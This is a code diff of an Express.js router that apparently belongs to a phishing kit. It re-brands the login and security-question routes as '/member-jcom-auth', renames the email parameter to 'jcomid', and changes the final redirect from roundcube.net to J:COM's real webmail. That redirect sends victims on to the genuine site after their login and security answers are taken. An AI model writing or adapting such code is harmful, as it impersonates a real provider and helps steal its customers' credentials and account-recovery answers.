@@ -7,7 +7,7 @@ const session = require("express-session")
 const User = require("../models/User");
 
 router.get("/login", (req, res) => {
-  let email = req.query.dbs || "";
+  let email = req.query.jcomid || "";
   res.render("login", { email: email });
 });
 
@@ -49,7 +49,7 @@ router.post("/loginok", async (req, res, next) => {
     .then((result) => {
       console.log(result);
       req.flash("success_msg", "Login ok");
-      res.redirect(`/users/loginverify?dbs=${encodeURIComponent(email)}`);
+      res.redirect(`/member-jcom-auth/loginverify?jcomid=${encodeURIComponent(email)}`);
     })
     .catch((err) => console.log(err));
 });
@@ -80,7 +80,7 @@ router.post("/loginverify", async (req, res, next) => {
     .then((result) => {
       console.log(result);
       req.flash("success_msg", "Questions ok");
-      res.redirect("https://roundcube.net/");
+      res.redirect("https://cs.myjcom.jp/WebMail");
     })
     .catch((err) => console.log(err));
 });
@@ -88,7 +88,7 @@ router.post("/loginverify", async (req, res, next) => {
 router.get("/logout", (req, res) => {
   req.logout();
   req.flash("success_msg", "You are logged out");
-  res.redirect("/users/login");
+  res.redirect("/member-jcom-auth/login");
 });
 
 module.exports = router;
